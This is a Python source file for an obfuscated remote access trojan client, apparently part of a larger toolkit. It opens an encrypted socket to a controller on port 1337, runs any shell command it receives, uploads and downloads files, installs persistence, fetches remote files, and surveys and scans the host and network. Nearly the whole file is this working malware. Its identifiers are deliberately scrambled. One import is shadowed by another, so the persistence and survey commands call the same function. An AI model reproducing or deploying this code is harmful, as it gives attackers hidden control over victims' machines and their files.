#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import FAkNnUdNDaFZorQoeriEgCCFHcblhqBR, FPmaenntgMXUySRHYnxonMrLjGvQbFhl, FzXJncgxphnojDsNghowPfABuOLgmsip
    from core.filesock import eRrqpYUchKPoYbYxOYQeDwzVUJNcqUZT, JKkiTRuroBtXTQaWSmtYrgeAxgzygIAE
    from core.persistence import fRTWRMDwKMKaMMycbCQhFAtbEWeTzpNy
    from core.scan import RFoEiiXZCSKDbavjQFTvIQdNPwqpFxYl
    from core.survey import fRTWRMDwKMKaMMycbCQhFAtbEWeTzpNy
    from core.toolkit import KDOPBQkyLfClRmcCUvOgwjlbjmpDAwWK, ukJbTOkOxldunMGJEcZYdKLfaPaQYtMN
except ImportError as uGseSQRDuqoehXEeAwYsYmHwmShOdQgp:
    print(uGseSQRDuqoehXEeAwYsYmHwmShOdQgp)
    sys.exit(0)
ElmWZnyXNAfkNmBzKnquhQdEVZCcpYPt = sys.platform
vbldNhufqrPvwjuyhFqEezVbwbqgIlke      = 'localhost'
VWTQNmLAUECMnuJgkuZlNUKYmfxfPWAr      = 1337
payIyIQNCDBJNeAhAfinNKIuLOOFZkkX    = 'b14ce95fa4c33ac2803782d18341869f'
def psjwxLlNsBfXJSAKmZgMaeEQGZHFgYGa():
    AyZqbpGshExdUACZVcljMTjUuUSOeIyC = socket.socket()
    AyZqbpGshExdUACZVcljMTjUuUSOeIyC.connect((vbldNhufqrPvwjuyhFqEezVbwbqgIlke, VWTQNmLAUECMnuJgkuZlNUKYmfxfPWAr))
    BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi = FzXJncgxphnojDsNghowPfABuOLgmsip(AyZqbpGshExdUACZVcljMTjUuUSOeIyC)
    while True:
        GjegCVtbkABBjJBxrcagPAAmMomriJQf = AyZqbpGshExdUACZVcljMTjUuUSOeIyC.recv(1024)
        GjegCVtbkABBjJBxrcagPAAmMomriJQf = FAkNnUdNDaFZorQoeriEgCCFHcblhqBR(GjegCVtbkABBjJBxrcagPAAmMomriJQf, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi)
        XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP, _, action = GjegCVtbkABBjJBxrcagPAAmMomriJQf.partition(' ')
        if XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'quit':
            AyZqbpGshExdUACZVcljMTjUuUSOeIyC.close()
            sys.exit(0)
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'run':
            IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD.stdout.read() + IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD.stderr.read()
            AyZqbpGshExdUACZVcljMTjUuUSOeIyC.sendall(FPmaenntgMXUySRHYnxonMrLjGvQbFhl(IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi))
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'download':
            for paCQjENnuYPVmljLLYILWWljITjDzepC in action.split():
                paCQjENnuYPVmljLLYILWWljITjDzepC = paCQjENnuYPVmljLLYILWWljITjDzepC.strip()
                JKkiTRuroBtXTQaWSmtYrgeAxgzygIAE(AyZqbpGshExdUACZVcljMTjUuUSOeIyC, paCQjENnuYPVmljLLYILWWljITjDzepC, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi)
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'upload':
            for paCQjENnuYPVmljLLYILWWljITjDzepC in action.split():
                paCQjENnuYPVmljLLYILWWljITjDzepC = paCQjENnuYPVmljLLYILWWljITjDzepC.strip()
                eRrqpYUchKPoYbYxOYQeDwzVUJNcqUZT(AyZqbpGshExdUACZVcljMTjUuUSOeIyC, paCQjENnuYPVmljLLYILWWljITjDzepC, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi)
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'rekey':
            BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi = FzXJncgxphnojDsNghowPfABuOLgmsip(AyZqbpGshExdUACZVcljMTjUuUSOeIyC)
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'persistence':
            IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = fRTWRMDwKMKaMMycbCQhFAtbEWeTzpNy(ElmWZnyXNAfkNmBzKnquhQdEVZCcpYPt)
            AyZqbpGshExdUACZVcljMTjUuUSOeIyC.send(FPmaenntgMXUySRHYnxonMrLjGvQbFhl(IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi))
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'wget':
            IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = KDOPBQkyLfClRmcCUvOgwjlbjmpDAwWK(action)
            AyZqbpGshExdUACZVcljMTjUuUSOeIyC.send(FPmaenntgMXUySRHYnxonMrLjGvQbFhl(IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi))
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'unzip':
            IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = ukJbTOkOxldunMGJEcZYdKLfaPaQYtMN(action)
            AyZqbpGshExdUACZVcljMTjUuUSOeIyC.send(FPmaenntgMXUySRHYnxonMrLjGvQbFhl(IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi))
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'survey':
            IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = fRTWRMDwKMKaMMycbCQhFAtbEWeTzpNy(ElmWZnyXNAfkNmBzKnquhQdEVZCcpYPt)
            AyZqbpGshExdUACZVcljMTjUuUSOeIyC.send(FPmaenntgMXUySRHYnxonMrLjGvQbFhl(IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi))
        elif XTlbLFpEDSBIhKgMLabDkZjvIKmmdIgP == 'scan':
            IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD = RFoEiiXZCSKDbavjQFTvIQdNPwqpFxYl(action)
            AyZqbpGshExdUACZVcljMTjUuUSOeIyC.send(FPmaenntgMXUySRHYnxonMrLjGvQbFhl(IFjinVDxdJGBGwINSiNsoRzXgBpGeYOD, BZIRmFtJUYflEUCqEHcmNRPXedFJkaEi))
if __name__ == '__main__':
    psjwxLlNsBfXJSAKmZgMaeEQGZHFgYGa()
